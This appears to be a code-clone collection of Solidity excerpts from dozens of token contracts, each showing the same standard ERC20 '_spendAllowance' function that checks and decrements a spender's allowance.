<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="125" endline="135" pcid="1838">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="124" endline="134" pcid="8221">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="125" endline="135" pcid="4424">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="126" endline="136" pcid="5983">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="123" endline="133" pcid="425">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="123" endline="133" pcid="555">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="120" endline="130" pcid="5490">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="124" endline="134" pcid="6057">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="126" endline="136" pcid="8714">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="123" endline="133" pcid="722">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="121" endline="131" pcid="8819">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="124" endline="134" pcid="2191">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="122" endline="132" pcid="5886">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="122" endline="132" pcid="3781">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="122" endline="132" pcid="5380">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="125" endline="135" pcid="8446">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="122" endline="132" pcid="1266">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="123" endline="133" pcid="6157">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="121" endline="131" pcid="7211">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="108" endline="118" pcid="8054">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="122" endline="132" pcid="540">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="123" endline="133" pcid="6371">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="124" endline="134" pcid="5475">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="123" endline="133" pcid="4023">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="125" endline="135" pcid="4652">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="121" endline="131" pcid="600">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="120" endline="130" pcid="8621">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="124" endline="134" pcid="234">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="124" endline="134" pcid="4975">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="122" endline="132" pcid="8266">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="125" endline="135" pcid="881">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="121" endline="131" pcid="1971">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="130" endline="140" pcid="5856">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="121" endline="131" pcid="5395">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="121" endline="131" pcid="1153">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="122" endline="132" pcid="8236">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="125" endline="135" pcid="7524">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="125" endline="135" pcid="352">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="122" endline="132" pcid="284">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="121" endline="131" pcid="1027">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="123" endline="133" pcid="3978">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="125" endline="135" pcid="8759">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="126" endline="136" pcid="4008">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="122" endline="132" pcid="8558">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="124" endline="134" pcid="6785">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="124" endline="134" pcid="4864">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="125" endline="135" pcid="4713">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="122" endline="132" pcid="7796">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="123" endline="133" pcid="1936">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="127" endline="137" pcid="1872">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="123" endline="133" pcid="4498">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="121" endline="131" pcid="9184">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="121" endline="131" pcid="6755">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="125" endline="135" pcid="5455">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="125" endline="135" pcid="7390">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="124" endline="134" pcid="948">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="124" endline="134" pcid="6770">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="118" endline="128" pcid="7059">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="122" endline="132" pcid="6386">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="120" endline="130" pcid="8041">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="124" endline="134" pcid="5917">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="121" endline="131" pcid="6126">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="124" endline="134" pcid="780">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="121" endline="131" pcid="4849">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="125" endline="135" pcid="3766">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="126" endline="136" pcid="997">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="126" endline="136" pcid="1516">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="126" endline="136" pcid="7257">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="128" endline="138" pcid="6111">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="124" endline="134" pcid="4613">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="123" endline="133" pcid="6433">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="225" endline="235" pcid="3751">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
